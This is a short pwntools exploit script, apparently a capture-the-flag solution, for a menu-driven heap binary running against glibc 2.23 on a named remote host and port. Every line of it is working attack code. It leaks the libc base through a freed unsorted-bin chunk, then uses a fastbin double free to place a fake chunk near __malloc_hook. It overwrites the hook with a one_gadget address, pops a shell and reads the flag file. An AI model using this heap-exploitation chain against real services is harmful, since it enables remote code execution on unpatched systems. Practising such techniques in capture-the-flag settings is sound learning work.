#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './B'
LIBC = './libc-2.23.so'
HOST = '140.110.112.77'
PORT = 4008

context.binary = BINARY
e = ELF( BINARY )
libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY, env={"LD_PRELOAD": LIBC} )

def a(size, data):
    r.sendafter('>', '1')
    r.sendafter('Size:', str(size))
    r.sendafter('Data:', data)

def s(idx):
    r.sendafter('>', '2')
    r.sendafter('Index :', str(idx))

def d(idx):
    r.sendafter('>', '3')
    r.sendafter('Index :', str(idx))

def bye():
    r.sendafter('>', '4')

ogs = [
    0x45216,
    0x4526a,
    0xcd0f3,
    0xcd1c8,
    0xf02b0,
    0xf02a4,
    0xf66f0,
    0xf1147,
] # len == 7

a(0x410, 'Q') # 0
a(0x68, 'A') # 1
a(0x68, 'B') # 2
a(0x68, 'C') # 3

d(0)
s(0)
libc_base = u64(r.recv(6) + b'\x00\x00') - 0x3c4b78 # offset
log.info(f"libc_base: {hex(libc_base)}")

d(1)
d(2)
d(1)
malloc_hook = libc_base + 0x3c4aed # - 0x23
log.info(f"fake chunks: {hex(malloc_hook)}")

a(0x68, p64(malloc_hook)) # 4
a(0x68, 'B'*0x30) # 5
a(0x68, 'C'*0x30) # 6
a(0x68, b'A'*0x13 + p64(libc_base + ogs[5]))

# any function about output, maybe malloc
# double free -> printf -> malloc -> malloc_hook
"""
r.sendafter('>', '1')
r.sendafter('Size:', '101')
"""
#d(0)

r.sendline('cat /home/`whoami`/flag')
r.interactive()
